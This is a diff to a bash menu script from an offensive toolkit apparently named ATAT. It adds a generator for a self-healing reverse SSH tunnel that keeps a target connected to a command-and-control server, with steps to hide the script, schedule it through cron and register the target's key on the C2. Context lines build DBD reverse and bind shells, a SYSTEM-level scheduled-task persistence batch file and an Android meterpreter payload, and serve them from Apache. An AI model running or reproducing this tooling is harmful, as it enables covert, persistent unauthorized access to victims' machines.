@@ -380,8 +380,8 @@ done
 echo -e "\E[1;34m::::: \e[97mPersistence Generator \E[1;34m:::::"
 echo -e "\E[1;34m::::: \e[97mBind Shells are a Work in Progress \E[1;34m:::::"
 echo -e "\E[1;34m::::: \e[97mThanks to Skysploit for the DBD Builder!! \E[1;34m:::::"
-PS3='Enter your choice: ENTER=Options Menu | 7=Main Menu | 8=QUIT: '
-options=("Windows DBD Reverse Shell" "Windows DBD Bind Shell" "Linux/NetBSD/FreeBSD/OpenBSD DBD Reverse Shell" "Linux/NetBSD/FreeBSD/OpenBSD DBD Bind Shell" "DBD Reboot Persistence Generator - Windows" "Android" "Main Menu" "Quit")
+PS3='Enter your choice: ENTER=Options Menu | 9=Main Menu | 10=QUIT: '
+options=("Windows DBD Reverse Shell" "Windows DBD Bind Shell" "Linux/NetBSD/FreeBSD/OpenBSD DBD Reverse Shell" "Linux/NetBSD/FreeBSD/OpenBSD DBD Bind Shell" "DBD Reboot Persistence Generator - Windows" "Configure C2 Server For Persistent SSH Session" "Persistent SSH Session Generator" "Android" "Main Menu" "Quit")
 select opt in "${options[@]}"
 do
     case $opt in
@@ -418,7 +418,7 @@ do
 		service apache2 start
 	fi  
 		cd ~/ATAT
-		echo "Starting Apache server to host payloads..."
+		echo -e "\E[1;34m\e[97m \e[31mStarting Apache server to host payloads...\e[97m\E[1;34m"
 		echo -e "\e[1;34mDone! Your payload is located at /var/www/html/winmgnt.txt (change to EXE for manual deployment)\e[0m"
 		echo ""
 		
@@ -497,7 +497,7 @@ do
 		service apache2 start
 	fi  
 		cd ~/ATAT
-		echo "Starting Apache server to host payloads..."
+		echo -e "\E[1;34m\e[97m \e[31mStarting Apache server to host payloads...\e[97m\E[1;34m"
 		echo -e "\e[1;34mDone! Your payload is located at /var/www/html/winmgnt.txt (change to EXE for manual deployment)\e[0m"
 		echo ""
 		echo -e "\e[1;34mWhen you are ready to connect to the victim, in your terminal enter:\e[0m"
@@ -558,7 +558,7 @@ do
 		chmod +x dbd
 		cp ~/ATAT/misc/dbd/dbd /var/www/html
 		chown www-data:www-data /var/www/html/dbd
-		echo "Starting Apache server to host payloads..."
+		echo -e "\E[1;34m\e[97m \e[31mStarting Apache server to host payloads...\e[97m\E[1;34m"
 		SERVICE=Apache;
 	secs=$(date '+%S');
 	if service apache2 status | grep -v grep | grep running > /dev/null
@@ -606,7 +606,7 @@ do
 		chmod +x dbd
 		cp ~/ATAT/misc/dbd/dbd /var/www/html
 		chown www-data:www-data /var/www/html/dbd
-		echo "Starting Apache server to host payloads..."
+		echo -e "\E[1;34m\e[97m \e[31mStarting Apache server to host payloads...\e[97m\E[1;34m"
 		SERVICE=Apache;
 	secs=$(date '+%S');
 	if service apache2 status | grep -v grep | grep running > /dev/null
@@ -640,7 +640,86 @@ do
 			echo %WINDIR%\\System32\\\taskmgnt.exe -i -d -s /accepteula %WINDIR%\\System32\\winmgnt.exe >> ~/ATAT/DBD_reboot.bat
 			echo schtasks /create /sc onstart /tn WindowsMgr /rl highest /ru SYSTEM /tr \"%WINDIR%\\System32\\winmgnt.exe\" >> ~/ATAT/DBD_reboot.bat
             echo -e "\E[1;34m::::: \e[97mDBD_reboot.bat saved to ~/ATAT. Upload to device in %WINDIR%\System32\ and run from a SYSTEM shell in that same directory.\E[1;34m:::::" 
-            ;; 
+            ;;
+        "Configure C2 Server For Persistent SSH Session")
+			echo -e "\e[1;34mRun This Once Before You Run The \"Client Connector Generator SSH\" Option \e[0m"
+			echo -e "\e[1;34mONLY RUN THIS *ONCE* ON YOUR COMMAND & CONTROL SERVER!! \e[0m"
+			sed -i -e '0,/PubkeyAuthentication/!b' -e '/PubkeyAuthentication/s/^#//' /etc/ssh/sshd_config
+			sed -i -e '0,/PasswordAuthentication/!b' -e '/PasswordAuthentication/s/^#//' /etc/ssh/sshd_config
+			sed -i -e '0,/AuthorizedKeysFile/!b' -e '/AuthorizedKeysFile/s/^#//' /etc/ssh/sshd_config
+			sed -i -e '0,/PasswordAuthentication/!b' -e '/PasswordAuthentication/s/^#//' /etc/ssh/ssh_config
+			service ssh restart
+            ;;
+        "Persistent SSH Session Generator")
+			echo -e "\e[1;34m**Step 1 - Create The Persistence (Self Healing SSH Connection) Script To Run On Your Target**\e[0m"
+			read -p 'Set Local SSH Port On Target (i.e., 1080): ' userlport; read -p 'Set SSH Port On C2 Server (i.e., 22): ' userrport; read -p 'Set Username On C2 Server: ' username; read -p 'Set IP/Domain Name Of C2 Server: ' userhost;
+#Make create_ssh_tunnel.sh something hidden and less suspicious with Ctrl+H
+			touch ~/ATAT/create_ssh_tunnel.sh
+			echo -e "#!/bin/bash" > ~/ATAT/create_ssh_tunnel.sh
+			echo -e "if ps ax | grep -v grep | grep \"ssh -N -R\" > /dev/null" >> ~/ATAT/create_ssh_tunnel.sh
+			echo -e "then" >> ~/ATAT/create_ssh_tunnel.sh
+			echo -e "    echo \"Tunnel running\"" >> ~/ATAT/create_ssh_tunnel.sh
+			echo -e "else" >> ~/ATAT/create_ssh_tunnel.sh
+			echo -e "    echo \"Tunnel is not running, Starting service.\"" >> ~/ATAT/create_ssh_tunnel.sh
+			echo -e "    ssh -N -R "$userlport":localhost:"$userrport" "$username"@"$userhost"" >> ~/ATAT/create_ssh_tunnel.sh
+			echo -e "fi" >> ~/ATAT/create_ssh_tunnel.sh
+			echo -e "\e[1;34m**Step 2 - Move ~/ATAT/create_ssh_tunnel.sh Script To Target (Recommend Placing It In ~/)**\e[0m"
+			echo -e "\e[1;34mExample Command:\e[0m"
+			echo -e "\E[1;34m\e[97m \e[31mscp ~/ATAT/create_ssh_tunnel.sh TARGET_USERNAME@TARGET_IP:~/\e[97m\E[1;34m"
+			read -p "Press Enter When Ready To Proceed"		
+			echo -e "\e[1;34m::::::::::::THESE FOLLOWING STEPS ARE TO BE DONE ON YOUR TARGET::::::::::::\e[0m"
+			echo ""
+			echo -e "\e[1;34m**Step 3 - Make Script Executable By Running This Command In Terminal On Your Target (Your Teminal Window Must \"cd\" Into The Directory Where You Placed The Script):**\e[0m"
+			echo -e "\E[1;34m\e[97m \e[31mchmod +x create_ssh_tunnel.sh\e[97m\E[1;34m"
+			echo ""
+			read -p "Press Enter When Ready To Proceed"
+			echo -e "\e[1;34m**Step 4 - Make Script Monitor & Repair The Connetion When Necessary**\e[0m"
+			echo -e "\e[1;34mNow Start The Crontab (Schedule The Job) With This Command:\e[0m"
+			echo -e "\E[1;34m\e[97m \e[31mcrontab -e\e[97m\E[1;34m"
+			echo -e "\e[1;34mPlace the line below in as your cron job (a once per minute check to see if the ssh connection is up, if not, attempt to bring it up):\e[0m"
+			echo ""
+			echo -e "\e[1;34mMAKE SURE To Enter YOUR Correct Path For The create_ssh_tunnel.sh File & The SSH Log File!!\e[0m"
+			echo -e "\E[1;34m\e[97m \e[31m*/1 * * * * /path/to/create_ssh_tunnel.sh > /home/<user>/.ssh/tunnel.log 2>&1\e[97m\E[1;34m"
+			read -p "Press Enter When Ready To Proceed"
+			echo ""
+			echo -e "\e[1;34m**Step 5 - Generate SSH Authentication Certificate On Target & Move Public Key To C2 Server**\e[0m"
+			echo -e "\e[1;34mRun This Command On Your Target:\e[0m"
+			echo -e "\E[1;34m\e[97m \e[31mssh-keygen -t rsa\e[97m\E[1;34m"
+			echo -e "\e[1;34mHit Enter To Accept All Defaults \e[0m" #(You May Select A Passphrase For Additional Security, Highly Recommended)
+cat << "EOF"
+Your private key will be generated using the default filename (e.g., id_rsa) and stored on your Target in a .ssh directory off your home directory (e.g., ~/.ssh/id_rsa).
+
+The corresponding public key will be generated using the same filename (but with a .pub extension added) and stored in the same location (e.g., ~/.ssh/id_rsa.pub).
+Use SCP to copy the public key file (e.g., ~/.ssh/id_rsa.pub) to your C2 Server, using this command:  
+EOF
+			echo -e "\E[1;34m\e[97m \e[31mscp ~/.ssh/id_rsa.pub "$username"@"$userhost":~/.ssh/tgt_id_rsa.pub \e[97m\E[1;34m"
+			echo ""
+			echo -e "\e[1;34mYou'll be prompted for your account password and, possibly to accept the SSH certificate (type \"yes\" in that case. Your public key will be copied to ~/.ssh/tgt_id_rsa.pub\e[0m"
+			read -p "Press Enter When Ready To Proceed"
+			echo ""
+			echo -e "\e[1;34m::::::::::::THESE FOLLOWING STEPS ARE TO BE DONE ON YOUR C2 Server::::::::::::\e[0m"
+			echo ""
+			echo -e "\e[1;34m**Step 5a - Make Sure You Have Run The \"Configure C2 Server For Persistent SSH Session\" Option On The C2 Server So It Is Ready To Accept The Connection**\e[0m"
+cat << "EOF"
+Also, you need to add your Target's public key to the ~/.ssh/authorized_keys file. If you do not have a ~/.ssh/authorized_keys file, you can create one as follows:
+EOF
+			echo -e "\E[1;34m\e[97m \e[31mmkdir -p ~/.ssh\e[97m\E[1;34m"
+			echo -e "\E[1;34m\e[97m \e[31mtouch ~/.ssh/authorized_keys\e[97m\E[1;34m"
+cat << "EOF"
+On the C2 Server, add the contents of your public key file (e.g., ~/.ssh/tgt_id_rsa.pub) to a new line in your ~/.ssh/authorized_keys file; on the command line, enter:
+EOF
+			echo -e "\E[1;34m\e[97m \e[31mcat ~/.ssh/tgt_id_rsa.pub >> ~/.ssh/authorized_keys\e[97m\E[1;34m"
+cat << "EOF"
+You may want to check the contents of ~/.ssh/authorized_keys to make sure your public key was added properly.
+Once your public key is added to your ~/.ssh/authorized_keys file on the C2 Server, you should now be able to SSH in with your private key. 
+EOF
+			read -p "Press Enter When Ready To Proceed"
+			echo ""
+			echo -e "\e[1;34mTo Connect To Target From C2 Server Enter The Following Command In Terminal (On C2 Server) \e[0m"
+			echo -e "\E[1;34m\e[97m \e[31mssh -l TARGET_USERNAME -p "$userlport" localhost \e[97m\E[1;34m"
+			echo -e "\e[1;34m**MAKE SURE** To Enter The Correct Username For The Target. Then Enter The SSH Password For The Target When Prompted. \e[0m"
+			echo ""		
+			;; 
         "Android")
         read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport;
 			msfvenom -f raw -p android/meterpreter/reverse_https LHOST=$userhost LPORT=$userport -o "System Framework.jar"
@@ -1130,7 +1209,7 @@ do
 		mkdir /tmp/ATAT/
 		echo ""
 
-	reqs="gcc gcc-mingw-w64-i686 curl jq bettercap libssl-dev libnl-genl-3-dev hostapd-wpe lynx airgeddon hostapd lighttpd asleap python-pip python-scapy gawk libatk-adaptor libgail-common bloodhound libxml2-dev libxslt1-dev unixodbc-dev git libssl1.0-dev libffi-dev python-dev tcpdump python-virtualenv"
+	reqs="gcc gcc-mingw-w64-i686 curl jq bettercap lbd masscan msfpc sslscan libssl-dev libnl-genl-3-dev hostapd-wpe lynx airgeddon hostapd lighttpd asleap python-pip python-scapy gawk libatk-adaptor libgail-common bloodhound libxml2-dev libxslt1-dev unixodbc-dev git libssl1.0-dev libffi-dev python-dev tcpdump python-virtualenv"
 	for i in $reqs; do
 		dpkg -s "$i" &> /tmp/ATAT/$i-install.txt
 		isinstalled=$(cat /tmp/ATAT/$i-install.txt | grep -o "Status: install ok installed")
